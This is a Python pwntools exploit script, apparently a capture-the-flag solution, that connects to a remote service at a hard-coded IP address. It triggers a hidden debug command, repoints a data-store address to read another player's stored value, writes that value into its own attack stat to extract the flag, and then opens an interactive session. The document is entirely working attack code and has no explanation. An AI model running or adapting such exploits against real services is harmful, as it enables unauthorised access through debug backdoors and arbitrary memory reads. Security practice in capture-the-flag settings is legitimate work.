from pwn import *

remote_addr="149.28.12.44"
remote_port=10001

p=remote(remote_addr,remote_port)
#context.log_level=True
ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x) 
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
def lg(s,addr):
    print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def raddr(a,l=None):
    if l is None:
        return u64(rv(a).ljust(8,'\x00'))
    else:
        return u64(rl().strip('\n').ljust(8,'\x00'))

my=0
boss=0
def cmd(command):
    sla('>',command)

def save():
    global my
    global boss
    cmd('save')
    my=int(rv(len('-1088065416')))
    rv(1)
    boss=int(rl().strip('\n'))
#    print(my)
#    print(boss)

def setaddress(addr):
    cmd(f'DebugSetDataStoreAddress#{str(addr)}')

def show():
    cmd('ShowInfo')

def hack():
    cmd('VeroFessIsHandsome')
    save()
    setaddress(boss)
    show()
    k=rl().strip('\n')[2:]
    setaddress(my)
    show()
    cmd(f"SetATK#{k}")
    show()
    flag=rl().split('|')[-1]
    cmd('VeroFessIsHandsome')
    p.interactive()

hack()
